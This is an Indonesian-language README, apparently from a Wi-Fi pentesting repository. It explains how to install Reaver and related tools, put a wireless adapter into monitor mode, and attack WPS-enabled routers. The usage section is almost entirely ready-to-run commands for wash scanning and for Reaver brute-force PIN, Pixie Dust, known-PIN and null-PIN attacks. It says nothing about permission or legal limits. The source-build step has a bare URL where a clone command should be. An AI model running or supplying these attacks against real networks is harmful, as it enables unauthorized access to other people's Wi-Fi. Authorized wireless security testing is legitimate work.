# Reaver

![Reaver](https://github.com/fixploit03/Pentest-WiFi/blob/main/tools/reaver/img/reaver.jpg)

## Instalasi

Kali Linux:

1. Menggunakan packet manager (`apt`):

   ```
   sudo apt-get update
   sudo apt install reaver aircrack-ng pixiewps
   ```

2. Melalui compile dari source:
   
   ```
   sudo apt-get update
   sudo apt-get install build-essential libpcap-dev git
   https://github.com/t6x/reaver-wps-fork-t6x
   cd reaver-wps-fork-t6x
   make
   sudo make install
   ```

## Setup Adapter Wi-Fi

1. Pasang adapter Wi-Fi ke laptop/PC.
2. Pada aplikasi VirtualBox klik tab `Devices` -> `USB` -> `Jenis/merek`.
3. Pastikan checkbox nya sudah tercentang.
4. Buka terminal.
5. Ketikkan `iwconfig`, pastikan nama interface `wlan0` muncul.
6. Kalau sudah muncul, aktifkan mode monitor menggunakan:

   ```
   sudo airmon-ng check kill
   sudo airmon-ng start wlan0
   ```
7. Cek kembali menggunakan `iwconfig` apakah mode interfacenya sudah berubah menjadi mode `Monitor`.
8. Cek packet injection menggunakan:

   ```
   sudo aireplay-ng --test wlan0
   ```
   
## Penggunaan

1. Scan Wi-Fi WPS:

   ```
   sudo wash -i [interface]
   ```

2. Pilih Taraget
   Pastikan status `Lck` (Lock) tidak menunjukkan `YES`. Jika `YES`, artinya fitur WPS sedang terkunci (tidak bisa diserang).

3. Jalankan Serangan

   1. Brute Force PIN Attack:

      ```
      sudo reaver -i [interface] -b [bssid] -c [channel] -vv
      ```
   2. Pixie Dust Attack

      ```
      sudo reaver -i [interface] -b [bssid] -c [channel] -K -vv
      ```
   3. Known PIN Attack

      ```
      sudo reaver -i [interface] -b [bssid] -c [channel] -p [pin_wps] -vv
      ```
   4. Null PIN Attack:

      ```
      sudo reaver -i [interface] -b [bssid] -c [channel] -p "" -vv
      ```

## Video Demonstrasi

https://youtu.be/ftriFQwsiNU?si=Ku-meK7gUpv-RXut
